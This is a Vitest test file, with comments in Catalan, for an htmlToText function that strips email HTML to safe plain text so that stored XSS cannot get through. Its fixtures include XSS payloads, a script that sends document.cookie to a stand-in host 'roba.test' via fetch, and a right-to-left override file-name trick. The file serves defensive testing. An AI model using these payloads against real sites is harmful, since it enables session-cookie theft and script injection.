/**
 * `htmlToText`.
 *
 * El cos d'un correu acaba a `tasks.description`, que la interfície pinta. **L'HTML d'un
 * desconegut allà dins és XSS emmagatzemat servit des del teu propi domini.** Aquestes
 * proves no són sobre format: són sobre què no ha de sobreviure.
 */

import { describe, expect, it } from 'vitest';
import { htmlToText } from './html-to-text.js';

describe('res de marcatge sobreviu', () => {
  it.each([
    ['<b>Hola</b>', 'Hola'],
    ['<a href="https://x.test">enllaç</a>', 'enllaç'],
    ['<img src=x onerror="alert(1)">', ''],
    ['<div>Un</div><div>Dos</div>', 'Un\nDos'],
  ])('%s → %s', (html, esperat) => {
    expect(htmlToText(html)).toBe(esperat);
  });
});

describe("s'elimina el CONTINGUT i no només les etiquetes", () => {
  it('el codi d’un script no acaba sent text de la descripció', () => {
    // Treure `<script>` i `</script>` i deixar el mig posaria JavaScript com a text.
    const dolent = '<p>Hola</p><script>fetch("https://roba.test?c="+document.cookie)</script>';
    const text = htmlToText(dolent);
    expect(text).toBe('Hola');
    expect(text).not.toContain('fetch');
    expect(text).not.toContain('cookie');
  });

  it('i un script sense tancar s’ho menja tot fins al final', () => {
    const text = htmlToText('<p>Hola</p><script>alert(1)');
    expect(text).not.toContain('alert');
  });

  it.each(['style', 'head'])('el bloc <%s> tampoc no és el missatge', (tag) => {
    const html = `<${tag}>body{color:red}</${tag}><p>El text</p>`;
    expect(htmlToText(html)).toBe('El text');
  });
});

describe('el que separa paràgrafs es respecta', () => {
  it('els salts i les llistes es llegeixen', () => {
    // Línia en blanc entre el paràgraf i la llista, i els ítems seguits: és el que fa un
    // paràgraf seguit d'una llista en qualsevol text pla.
    const html = '<p>Primer</p><ul><li>Un</li><li>Dos</li></ul>';
    expect(htmlToText(html)).toBe('Primer\n\n· Un\n· Dos');
  });

  it('i no queden tres línies buides seguides', () => {
    expect(htmlToText('<p>A</p><br><br><br><p>B</p>')).toBe('A\n\nB');
  });
});

describe('les entitats es descodifiquen', () => {
  it.each([
    ['&lt;script&gt;', '<script>'],
    ['Caf&eacute;', 'Café'],
    ['A&nbsp;B', 'A B'],
    ['&#x27;cometa&#39;', "'cometa'"],
  ])('%s → %s', (html, esperat) => {
    expect(htmlToText(html)).toBe(esperat);
  });

  it('i una entitat descodificada NO es torna a interpretar', () => {
    /**
     * El mateix argument que la plantilla: si el resultat es reescanegés, `&lt;script&gt;`
     * es convertiria en una etiqueta de debò després d'haver-les tret totes.
     */
    expect(htmlToText('&lt;img src=x onerror=alert(1)&gt;')).toBe('<img src=x onerror=alert(1)>');
  });
});

describe('el que arriba de fora i no s’ha de veure', () => {
  it('les marques bidireccionals i d’amplada zero se’n van', () => {
    expect(htmlToText('<p>factura‮gpj.exe</p>')).not.toContain('‮');
    expect(htmlToText('<p>Fact​ura</p>')).toBe('Factura');
  });

  it('una newsletter de mig mega es talla', () => {
    const enorme = `<p>${'x'.repeat(20000)}</p>`;
    const text = htmlToText(enorme);
    expect(text.length).toBeLessThanOrEqual(8192);
    expect(text.endsWith('…')).toBe(true);
  });
});
